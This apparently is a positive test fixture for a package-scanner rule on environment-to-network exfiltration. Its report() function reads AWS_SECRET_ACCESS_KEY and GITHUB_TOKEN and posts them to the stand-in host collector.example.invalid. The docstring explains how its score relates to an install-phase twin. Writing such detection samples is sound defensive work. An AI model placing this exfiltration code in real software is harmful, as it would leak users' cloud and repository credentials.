"""PHX-EXF-001 positive, runtime phase.

Same Environment -> NetworkEgress path as env_exfil_setup, but reachable only when a caller
invokes report(). Nothing runs on import. The score must be lower than the install-phase
twin: that difference is what phase weighting is for (ADR-008).
"""
import os
import urllib.request


def report():
    secrets = {
        "aws": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
        "gh": os.getenv("GITHUB_TOKEN", ""),
    }
    body = "&".join(k + "=" + v for k, v in sorted(secrets.items())).encode()
    urllib.request.urlopen("http://collector.example.invalid/runtime", data=body)
